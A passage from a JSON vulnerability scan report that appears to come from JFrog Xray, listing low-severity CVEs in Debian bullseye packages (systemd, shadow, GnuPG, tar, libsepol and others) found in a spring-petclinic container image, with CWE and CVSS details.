         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31439",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31439",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522309",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31438",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31438",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522309",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31438",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31438",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-513968",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:login",
         "source_id": "deb://debian:bullseye:login",
         "source_comp_id": "deb://debian:bullseye:login:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "< 1:4.8.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1:4.8.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-29383",
                     "cwe": [
                        "CWE-74"
                     ],
                     "cwe_details": {
                        "CWE-74": {
                           "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
                           "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
                        }
                     },
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-29383",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-513968",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:passwd",
         "source_id": "deb://debian:bullseye:passwd",
         "source_comp_id": "deb://debian:bullseye:passwd:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "< 1:4.8.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1:4.8.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-29383",
                     "cwe": [
                        "CWE-74"
                     ],
                     "cwe_details": {
                        "CWE-74": {
                           "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
                           "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
                        }
                     },
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-29383",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-425648",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gpgv",
         "source_id": "deb://debian:bullseye:gpgv",
         "source_comp_id": "deb://debian:bullseye:gpgv:2.2.27-2+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:gnupg2",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3219",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-3219",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-42166",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a \"BEAST\" attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2011-3389",
                     "cwe": [
                        "CWE-326"
                     ],
                     "cwe_details": {
                        "CWE-326": {
                           "name": "Inadequate Encryption Strength",
                           "description": "The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required."
                        }
                     },
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N"
                  }
               ],
               "description": "The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a \"BEAST\" attack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2011-3389",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-414652",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Tar through 1.34 has a one-byte out-of-bounds read that results in use of uninitialized memory for a conditional jump. Exploitation to change the flow of control has not been demonstrated. The issue occurs in from_header in list.c via a V7 archive in which mtime has approximately 11 whitespace characters.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:tar",
         "source_id": "deb://debian:bullseye:tar",
         "source_comp_id": "deb://debian:bullseye:tar:1.34+dfsg-1",
         "component_versions": {
            "id": "debian:bullseye:tar",
            "vulnerable_versions": [
               "< 1.34+dfsg-1+deb11u1"
            ],
            "fixed_versions": [
               "1.34+dfsg-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-48303",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "GNU Tar through 1.34 has a one-byte out-of-bounds read that results in use of uninitialized memory for a conditional jump. Exploitation to change the flow of control has not been demonstrated. The issue occurs in from_header in list.c via a V7 archive in which mtime has approximately 11 whitespace characters.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-48303",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-37289",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:login",
         "source_id": "deb://debian:bullseye:login",
         "source_comp_id": "deb://debian:bullseye:login:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2007-5686",
                     "cwe": [
                        "CWE-264"
                     ],
                     "cvss_v2": "4.9/CVSS:2.0/AV:L/AC:L/Au:N/C:C/I:N/A:N"
                  }
               ],
               "description": "initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2007-5686",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-37289",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:passwd",
         "source_id": "deb://debian:bullseye:passwd",
         "source_comp_id": "deb://debian:bullseye:passwd:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2007-5686",
                     "cwe": [
                        "CWE-264"
                     ],
                     "cvss_v2": "4.9/CVSS:2.0/AV:L/AC:L/Au:N/C:C/I:N/A:N"
                  }
               ],
               "description": "initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2007-5686",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-36310",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "_is_safe in the File::Temp module for Perl does not properly handle symlinks.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2011-4116",
                     "cwe": [
                        "CWE-59"
                     ],
                     "cwe_details": {
                        "CWE-59": {
                           "name": "Improper Link Resolution Before File Access ('Link Following')",
                           "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "_is_safe in the File::Temp module for Perl does not properly handle symlinks.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2011-4116",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-35953",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "shadow: TOCTOU (time-of-check time-of-use) race condition when copying and removing directory trees",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:passwd",
         "source_id": "deb://debian:bullseye:passwd",
         "source_comp_id": "deb://debian:bullseye:passwd:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2013-4235",
                     "cwe": [
                        "CWE-367"
                     ],
                     "cwe_details": {
                        "CWE-367": {
                           "name": "Time-of-check Time-of-use (TOCTOU) Race Condition",
                           "description": "The product checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the product to perform invalid actions when the resource is in an unexpected state."
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:P/A:P",
                     "cvss_v3": "4.7/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "shadow: TOCTOU (time-of-check time-of-use) race condition when copying and removing directory trees",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2013-4235",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-35953",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "shadow: TOCTOU (time-of-check time-of-use) race condition when copying and removing directory trees",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:login",
         "source_id": "deb://debian:bullseye:login",
         "source_comp_id": "deb://debian:bullseye:login:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2013-4235",
                     "cwe": [
                        "CWE-367"
                     ],
                     "cwe_details": {
                        "CWE-367": {
                           "name": "Time-of-check Time-of-use (TOCTOU) Race Condition",
                           "description": "The product checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the product to perform invalid actions when the resource is in an unexpected state."
                        }
                     },
                     "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:P/A:P",
                     "cvss_v3": "4.7/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "shadow: TOCTOU (time-of-check time-of-use) race condition when copying and removing directory trees",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2013-4235",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-28549",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:coreutils",
         "source_id": "deb://debian:bullseye:coreutils",
         "source_comp_id": "deb://debian:bullseye:coreutils:8.32-4+b1",
         "component_versions": {
            "id": "debian:bullseye:coreutils",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2016-2781",
                     "cwe": [
                        "CWE-20"
                     ],
                     "cwe_details": {
                        "CWE-20": {
                           "name": "Improper Input Validation",
                           "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "6"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "6.5/CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"
                  }
               ],
               "description": "chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2016-2781",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-178846",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The CIL compiler in SELinux 3.2 has a heap-based buffer over-read in ebitmap_match_any (called indirectly from cil_check_neverallow). This occurs because there is sometimes a lack of checks for invalid statements in an optional block.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsepol1",
         "source_id": "deb://debian:bullseye:libsepol1",
         "source_comp_id": "deb://debian:bullseye:libsepol1:3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libsepol",
            "vulnerable_versions": [
               "< 3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-36087",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "The CIL compiler in SELinux 3.2 has a heap-based buffer over-read in ebitmap_match_any (called indirectly from cil_check_neverallow). This occurs because there is sometimes a lack of checks for invalid statements in an optional block.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-36087",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-178845",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The CIL compiler in SELinux 3.2 has a use-after-free in cil_reset_classpermission (called from cil_reset_classperms_set and cil_reset_classperms_list).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsepol1",
         "source_id": "deb://debian:bullseye:libsepol1",
         "source_comp_id": "deb://debian:bullseye:libsepol1:3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libsepol",
            "vulnerable_versions": [
               "< 3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-36086",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "The CIL compiler in SELinux 3.2 has a use-after-free in cil_reset_classpermission (called from cil_reset_classperms_set and cil_reset_classperms_list).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-36086",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-178839",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The CIL compiler in SELinux 3.2 has a use-after-free in __cil_verify_classperms (called from __verify_map_perm_classperms and hashtab_map).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsepol1",
         "source_id": "deb://debian:bullseye:libsepol1",
         "source_comp_id": "deb://debian:bullseye:libsepol1:3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libsepol",
            "vulnerable_versions": [
               "< 3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-36085",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
